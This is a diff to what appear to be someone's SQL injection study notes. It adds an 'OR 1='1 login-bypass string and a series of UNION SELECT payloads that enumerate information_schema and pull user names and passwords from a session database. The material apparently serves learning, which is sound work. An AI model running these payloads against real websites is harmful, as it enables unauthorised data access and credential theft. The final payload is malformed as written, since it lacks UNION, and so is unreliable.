@@ -158,9 +158,27 @@ POST METHOD (sending data to server)
 tom' OR 1='1
 'tom' OR 1=1;
 Looking at inspect source to gain info on crafting sql injection
-when ran as php on site add ? to add anything onto it. (?username=tom'OR 1='1 & passwd=tom'OR 1='1)
+when ran as php on site add ? to add anything onto it. (?username=tom'OR 1='1 & passwd=tom'OR 1='1) - will spit out passwords
 
+Nesting Statements - 
+    php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
 
+union select <column> from <database>.<table> 
+
+table.schema = list of database names 
+
+table_name = list of table names
+
+column_names = list of column names
+
+Audi' UNION SELECT 1,2,3,4,5;#
+Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.tables; # (dumps all tables and their names)
+
+Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.columns; #(retrives database names table names and column names.)
+
+Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns WHERE table_schema='session'; # (Retrieves information about the database in use)
+
+Audi' SELECT id,2,name,pass,5 from session.user;# (pull rom the exact columns you want)
 
 #SQL Injection primary methods
 
